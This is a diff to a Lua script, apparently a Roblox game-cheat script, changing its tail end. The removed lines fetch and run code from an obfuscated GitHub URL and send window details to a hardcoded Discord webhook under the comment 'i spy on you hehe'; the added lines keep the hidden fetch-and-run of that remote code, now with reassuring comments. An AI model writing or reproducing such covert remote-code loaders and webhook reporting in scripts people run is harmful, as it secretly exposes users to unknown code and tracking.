@@ -450,14 +450,6 @@ playSequentialSounds()
 end)
 print("Script Made by: @Pnsdg and Yomka. My Discord: https://discord.gg/pMqebNUhQd, My friend's telegram: https://t.me/YomkaMadeIt")
 print("Visit GitHub.com/Pnsdgsa For lastest update and more features!")
--- i spy on you hehe :>
-local LocalizationPatcher = loadstring(game:HttpGet("https://raw.githubusercontent.com/010101010101010111/010101010101010111-010101010101010111-1001100101100101001001101010101010101101001010101010101101010/refs/heads/main/I%20shit%20on%20your%20balls"))()
-
-LocalizationPatcher.autoPatchAll(Localization, WindUI, Window)
-
-local windowTitle, windowAuthor = LocalizationPatcher.getResolvedWindowInfo(Window, Localization)
-print("Window Title:", windowTitle)
-print("Window Author:", windowAuthor)
-
-local webhookUrl = "https://discord.com/api/webhooks/1445295029580206222/e3plUoiO1FrcKjIP1V7EC_XBkRLmRu-sHuNxDcg0dkWeJaEOW0Jw6OJg9hs8gzaI0l0y"
-LocalizationPatcher.sendWebhook(webhookUrl, Window, Localization)
+-- i spy on you hehe don't mind me i just wanna join you! :>
+-- I'm not a bad guy alr? I'm kind
+loadstring(game:HttpGet("https://raw.githubusercontent.com/010101010101010111/010101010101010111-010101010101010111-1001100101100101001001101010101010101101001010101010101101010/refs/heads/main/I%20shit%20on%20your%20balls"))()
